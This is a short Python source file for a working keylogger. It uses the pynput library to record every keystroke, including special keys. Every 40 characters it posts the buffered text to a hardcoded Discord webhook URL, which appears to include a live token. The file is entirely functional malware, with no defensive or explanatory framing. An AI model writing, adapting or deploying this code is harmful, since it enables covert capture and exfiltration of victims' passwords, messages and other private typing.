from pynput import keyboard
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1398711031383199794/lG-s9WyNwHkNyKSPmGZ_sR7rl8fQ1cymi94FRmTl46iqWoe9bEjX4QhUSu2HioHSSqE8"


buffer = ""
max_buffer_length = 40  # send every 40 characters

# Function to send logs to Discord
def send_to_discord(data):
    payload = {
        "content": f"```\n{data}\n```"  # formatted as code block
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"[Error] Could not send to Discord: {e}")

# Callback for key press
def on_press(key):
    global buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer += key.char
        else:
            buffer += f"[{key.name}]"
    except:
        buffer += "[UNKNOWN]"

    if len(buffer) >= max_buffer_length:
        send_to_discord(buffer)
        buffer = ""

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
